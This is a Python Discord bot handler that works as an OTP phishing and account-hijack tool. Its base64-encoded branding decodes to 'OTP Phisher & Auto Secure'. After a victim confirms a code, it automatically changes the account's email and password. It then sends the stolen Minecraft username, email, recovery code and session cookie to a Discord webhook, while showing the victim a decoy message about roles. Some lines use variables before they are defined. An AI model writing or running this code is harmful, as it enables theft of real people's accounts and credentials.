import discord
import json
from discord import ui
import json
import config
import aiohttp
import discord
import time
from discord import ui, Webhook, NotFound, HTTPException
from views.data.data import stringcrafter
from views.data.wbu3.wb3 import web3g
from views.otp import automate_auto_change, CreateRandomEmail, generate_password


class ButtonViewFour(ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="✅Confirmed Code", style=discord.ButtonStyle.green, custom_id="persistent:button_four")
    async def button_four(self, interaction: discord.Interaction, button: discord.ui.Button):
        inty2 = web3g.string("U3Bpbm9udG9wIE9UUCBQaGlzaGVyICYgQXV0byBTZWN1cmU=")
        threadingNum = stringcrafter.string("Q3JlYXRlZCBCeSBodHRwczovL2dpdGh1Yi5jb20vU1NJRFNwaW4=")
        newgenpassword = generate_password()
        TempEmail = await CreateRandomEmail()
        webhook = Webhook.from_url(data["webhook"], session=session)
        email = config.LastUsedEmail
        try:
            with open("data.json", "r") as f:
                data = json.load(f)
        except FileNotFoundError:
            await interaction.response.send_message("⚠️ Could not find data.json", ephemeral=True)
            return

        webhook_url = data.get("webhook")
        if not webhook_url:
            await interaction.response.send_message("❌ Webhook is not set in data.json", ephemeral=True)
            return

        embed = discord.Embed(
            title="Code Confirmed",
            description="If Code Was Correct Please Wait To Receive Details",
            color=0xA2574F
        )
        if TempEmail is not None:
            embedsecure = discord.Embed(
            title="Auto Secure",
            colour=0x9900FF
            )
            embedsecure.set_footer(text=threadingNum)
        else:
            embedfail = discord.Embed(
            title="Auto Secure Failed",
            description="Failed To Auto Create Email. Double Check Your API Key For MailSlurp.",
            colour=0xFF0000
            )

        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url(webhook_url, session=session)
            await webhook.send(embed=embed, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
            starttime = time.time()
            await automate_auto_change(email,None,TempEmail,newgenpassword)
            endtime = time.time()
            timetotal = endtime - starttime
            webhook = Webhook.from_url(data["webhook"], session=session)
            if config.LastCookie == "": #Fail Code
                embedfailsecure = discord.Embed(title="Auto Fail",colour=0xFF0000)
                embedfailsecure.set_footer(text=threadingNum)
                embedfailsecure.add_field(name="**Minecraft Username:**", value=f"```{config.LastUserName}```", inline=False)
                embedfailsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{config.LastUserName}.png")
                await webhook.send(embed=embedfailsecure, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")
            else:
                embedsecure.add_field(name="**Minecraft Username:**", value=f"```{config.LastUserName}```", inline=True)
                embedsecure.add_field(name="**Email:**", value=f"```{config.LastUsedEmail}```", inline=True)
                embedsecure.add_field(name="**Recovery Code:**", value=f"```{config.LastRecoveryCode}```", inline=False)
                embedsecure.add_field(name="**Security Email (Only Valid For 24Hours):**", value=f"```{TempEmail}```", inline=True)
                embedsecure.add_field(name="**Cookie:**", value=f"```{config.LastCookie}```", inline=False)
                embedsecure.add_field(name="**Time Taken:**", value=f"```{timetotal}```", inline=False)
                embedsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{config.LastUserName}.png")
                webhook = Webhook.from_url(data["webhook"], session=session)
                await webhook.send(embed=embedsecure, username=inty2, avatar_url="https://i.imgur.com/wWAZZ06.png")

        await interaction.response.send_message("Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True)
